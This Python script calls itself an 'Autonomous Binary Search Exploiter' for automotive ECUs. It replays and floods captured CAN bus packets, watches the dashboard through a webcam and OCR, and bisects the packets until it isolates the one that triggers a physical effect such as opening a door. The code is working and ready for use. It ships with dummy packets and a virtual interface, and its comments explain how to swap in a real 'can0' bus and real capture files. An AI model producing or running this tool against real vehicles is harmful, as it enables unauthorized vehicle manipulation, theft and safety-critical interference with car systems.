#!/usr/bin/env python3
"""
[AutoHack Tool-kit v2.0] - Autonomous Binary Search Exploiter
Author: R00T-Kim (Refactored by Senior Exploit Dev)
Target: Automotive ECU (CAN Bus)
Description: 
    Injects CAN packets and automatically verifies physical effects (Dashboard) 
    using Computer Vision (OCR). Performs binary search to isolate the culprit packet.
"""

import can
import cv2
import pytesseract
import time
import sys
import logging
import numpy as np
from typing import List, Tuple, Optional

# --- Configuration ---
CAN_INTERFACE = 'vcan0'  # 실제 환경: 'can0', 'slcan0' 등
BITRATE = 500000
CAMERA_INDEX = 0         # 웹캠 ID (0: 내장, 1: 외장)
OCR_TARGET_TEXT = "DOOR" # 감지할 목표 텍스트 (예: "DOOR", "OPEN", "ERR", "km/h")
REACTION_DELAY = 1.5     # 패킷 전송 후 계기판 반응 대기 시간 (초)
BURST_DURATION = 0.5     # 패킷 그룹을 유지(Flooding)하는 시간 (초)

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger("AutoExploit")

class AutoExploitBisector:
    def __init__(self, interface: str, target_text: str):
        self.interface = interface
        self.target_text = target_text.upper()
        self.bus = None
        self.cap = None
        
        self._init_hardware()

    def _init_hardware(self):
        """CAN 버스와 카메라 초기화"""
        try:
            self.bus = can.interface.Bus(channel=self.interface, bustype='socketcan')
            logger.info(f"[*] CAN Interface '{self.interface}' connected.")
        except Exception as e:
            logger.error(f"[!] CAN Error: {e}. Switching to Virtual Mode for Logic Check.")
            # 실제 연결 실패 시 테스트를 위한 Mock 객체 생성 가능
            self.bus = None

        self.cap = cv2.VideoCapture(CAMERA_INDEX)
        if not self.cap.isOpened():
            logger.error("[!] Camera access failed.")
            sys.exit(1)
        else:
            logger.info(f"[*] Camera initialized. Target Keyword: '{self.target_text}'")

    def _preprocess_image(self, frame):
        """OCR 인식률 향상을 위한 이미지 전처리"""
        # 1. 흑백 변환
        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
        # 2. 노이즈 제거 (Gaussian Blur)
        blur = cv2.GaussianBlur(gray, (5, 5), 0)
        # 3. 이진화 (Thresholding) - 글자를 선명하게
        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        return thresh

    def check_visual_feedback(self) -> bool:
        """카메라를 통해 타겟 텍스트가 화면에 나타났는지 확인"""
        ret, frame = self.cap.read()
        if not ret:
            logger.warning("[-] Failed to grab frame.")
            return False

        processed = self._preprocess_image(frame)
        
        # Tesseract 설정: --psm 6 (단일 텍스트 블록) 등 상황에 맞춰 조정
        # 한글 인식 필요 시 lang='kor' 추가
        ocr_result = pytesseract.image_to_string(processed, config='--psm 6').upper()
        
        # 디버깅용: 현재 인식된 텍스트 출력 (주석 처리 가능)
        # logger.debug(f"OCR Output: {ocr_result.strip()}")

        if self.target_text in ocr_result:
            return True
        return False

    def send_burst(self, packets: List[can.Message]):
        """
        패킷 리스트를 일정 시간 동안 반복 전송 (Flooding)
        이유: 단일 프레임 전송은 ECU 상태를 유지시키지 못할 수 있음.
        """
        if not self.bus: return # Virtual Mode

        end_time = time.time() + BURST_DURATION
        count = 0
        
        # 지정된 시간 동안 패킷 그룹을 계속 쏟아부음
        while time.time() < end_time:
            for msg in packets:
                try:
                    self.bus.send(msg)
                    count += 1
                except can.CanError:
                    pass
            time.sleep(0.001) # Bus Load 조절
        
        return count

    def run_bisect(self, packets: List[can.Message]) -> Optional[can.Message]:
        """재귀적 이진 탐색 로직"""
        n = len(packets)
        logger.info(f"--- Bisect Scope: {n} packets ---")

        # Base Case: 패킷이 하나만 남았을 때
        if n == 1:
            target_pkt = packets[0]
            logger.info(">> Verifying final candidate...")
            self.send_burst([target_pkt])
            time.sleep(REACTION_DELAY)
            
            if self.check_visual_feedback():
                return target_pkt
            else:
                return None

        mid = n // 2
        first_half = packets[:mid]
        second_half = packets[mid:]

        # 1. 전반부(First Half) 테스트
        logger.info(f">> Testing 1st half ({len(first_half)} pkts)")
        self.send_burst(first_half)
        
        # ECU 반응 및 카메라 딜레이 대기
        time.sleep(REACTION_DELAY)

        if self.check_visual_feedback():
            logger.info("[+] Target detected in 1st half! Narrowing down...")
            return self.run_bisect(first_half)
        
        # 2. 후반부(Second Half) 테스트
        # 전반부에서 반응이 없었다면, 후반부에 있다고 가정 (혹은 명시적 테스트)
        logger.info(f">> Target likely in 2nd half ({len(second_half)} pkts). Switching...")
        # 안전을 위해 잠시 대기 후 진행 (잔여 상태 클리어)
        time.sleep(1.0) 
        
        return self.run_bisect(second_half)

    def cleanup(self):
        if self.cap:
            self.cap.release()
        if self.bus:
            self.bus.shutdown()
        cv2.destroyAllWindows()

# --- Dummy Data Generator (For Testing) ---
def load_dummy_packets():
    pkts = []
    for i in range(100):
        pkts.append(can.Message(arbitration_id=0x100+i, data=[0x00]*8, is_extended_id=False))
    # 55번째 패킷을 '정답'으로 가정 (실제 환경에서는 이 패킷이 문을 엶)
    pkts[55].data = [0xDE, 0xAD, 0xBE, 0xEF] 
    return pkts

# --- Main Execution ---
if __name__ == "__main__":
    print("\n" + "="*50)
    print("   AutoHack v2.0 - Closed-Loop Bisect Exploiter")
    print("="*50 + "\n")

    # 1. 로그 파일 로드 (여기서는 더미 데이터)
    # 실제 사용: packets = can.BLFReader("capture.blf") 등으로 로드
    packets = load_dummy_packets()
    logger.info(f"[*] Loaded {len(packets)} packets for replay.")

    # 2. 엔진 초기화
    # 감지하려는 텍스트: 예) 문이 열리면 계기판에 "Door"라고 뜬다고 가정
    exploiter = AutoExploitBisector(interface=CAN_INTERFACE, target_text=OCR_TARGET_TEXT)

    try:
        logger.info("[*] Check your camera position. Starting in 3 seconds...")
        time.sleep(3)

        # 3. 베이스라인 체크 (이미 켜져있는지 확인)
        if exploiter.check_visual_feedback():
            logger.warning("[!] Warning: Target state ALREADY active. Please reset ECU/Cluster.")
            sys.exit(0)

        # 4. 이진 탐색 시작
        culprit = exploiter.run_bisect(packets)

        if culprit:
            print("\n" + "#"*50)
            print(f"🔥 VULNERABILITY FOUND! 🔥")
            print(f"ID  : {hex(culprit.arbitration_id)}")
            print(f"Data: {culprit.data.hex()}")
            print(f"Type: {'Extended' if culprit.is_extended_id else 'Standard'}")
            print("#"*50)
        else:
            logger.error("[-] Failed to isolate the packet. Try adjusting OCR threshold or delay.")

    except KeyboardInterrupt:
        logger.info("\n[!] Aborted by user.")
    finally:
        exploiter.cleanup()
